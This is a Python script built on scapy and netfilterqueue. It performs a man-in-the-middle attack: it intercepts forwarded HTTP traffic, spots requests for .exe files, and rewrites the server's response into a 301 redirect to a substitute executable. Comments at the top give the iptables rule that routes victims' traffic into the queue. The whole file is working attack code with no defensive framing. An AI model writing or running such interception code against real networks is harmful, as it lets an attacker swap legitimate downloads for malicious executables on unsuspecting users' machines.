#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

from netfilterqueue import NetfilterQueue
import scapy.all as scapy

# This list stores the acknowledgement numbers in the TCP field
# Ack number = Sequence number of next frame
ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def pkt_filter_callback(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # The Raw layer contains the actual HTTP data
    if scapy_packet.haslayer(scapy.Raw):
        # Finding whether this is a HTTP request
        # The TCP layer contains this data
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            # File type to sniff
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        # HTTP response
        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                # Removing the ack number as its corresponding seq has been caught
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # code 200 is OK
                # code 301 is Moved Permanently to redirect to a different URL
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://demo.exe\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


# The queue creates an instance of the NetfilterQueue which stores packets captured
queue = NetfilterQueue()
# Binds the queue to a particular queue number and calls a callback function
queue.bind(0, pkt_filter_callback)

try:
    print('Controller packet filtering mode')
    queue.run()

except KeyboardInterrupt:
    print('Quitting packet filter')
    queue.unbind()

    raise KeyboardInterrupt
